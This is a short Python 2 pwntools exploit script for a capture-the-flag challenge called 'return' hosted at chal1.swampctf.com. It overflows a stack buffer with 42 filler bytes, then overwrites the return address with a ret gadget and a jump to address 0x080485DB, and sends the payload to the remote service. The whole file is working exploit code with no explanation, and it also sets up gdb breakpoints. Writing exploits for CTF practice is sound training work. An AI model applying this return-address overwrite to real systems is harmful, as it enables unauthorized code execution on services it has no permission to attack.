#!/usr/bin/env python2
from pwn import *
import monkeyhex

HOST = "chal1.swampctf.com"
PORT = 1802

file_path = "./return"
# libc_path = "./libc.so.6"
proc_args = []

gdb_bps = []
gdb_bps += [0x8048595]
gdb_cmd = []
gdb_cmd += ["break *" + hex(x) for x in gdb_bps]
gdb_cmd += ['c']
gdb_cmd = '\n'.join(gdb_cmd)

# gdb_env = {'LD_PRELOAD': './libc.so.6'}

context.binary = file_path
context.log_level = 'critical'
context.terminal = ['konsole', '-e']

#proc = process(file_path)
proc = remote(HOST, PORT)
#proc = gdb.debug(file_path)
#elf = ELF(file_path)
#libc = ELF(libc_path)

ret_addr = 	  0x08048433
assert(ret_addr < 0x08048595)

payload = ""
payload += "A" * 42
payload += p32(ret_addr)
payload += p32(0x080485DB)


with open("payload", "w") as file:
	file.write(payload)
	
print proc.sendlineafter("do: \n", payload)
print proc.recvall()
